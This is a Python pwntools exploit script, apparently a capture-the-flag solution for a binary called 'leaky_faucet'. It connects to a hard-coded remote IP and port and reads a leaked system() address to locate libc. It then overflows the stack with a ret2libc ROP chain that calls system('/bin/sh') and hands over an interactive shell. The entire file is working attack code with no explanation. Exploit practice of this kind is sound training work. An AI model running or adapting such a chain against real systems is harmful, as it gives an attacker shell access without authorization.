#!/usr/bin/env python3

import re
from pwn import *

EXE = ELF("./leaky_faucet")
libc = ELF("./libc.so.6")
rop = ROP(libc)

print(EXE.path)
if args.REMOTE:
    r = remote("165.227.103.166", 6004)
elif args.GDB:
    r = gdb.debug(EXE.path, "b main")
else:
    r = process(EXE.path)


data = r.recvuntil(b"                 drip..\n\n")
system_addr = re.search("\s+(0x.+)\n", data.decode())[0].strip()
system_addr = int(system_addr, 16)

log.info("Leaked system address: " + hex(system_addr))

libc.address = system_addr - libc.symbols["system"]

log.success("Libc address: " + hex(libc.address))

binsh = next(libc.search(b"/bin/sh"))
libc_exit = libc.symbols["exit"]
pop_rdi = libc.address + rop.find_gadget(["pop rdi", "ret"])[0]
ret = libc.address + rop.find_gadget(["ret"])[0]

log.info("Found /bin/sh: " + hex(binsh))
log.info("Found exit: " + hex(libc_exit))
log.info("Found pop rdi: " + hex(pop_rdi))

payload = (
    b"A" * 40 + p64(ret) + p64(pop_rdi) + p64(binsh) +
    p64(system_addr) + p64(libc_exit)
)
r.sendline(payload)
r.interactive()
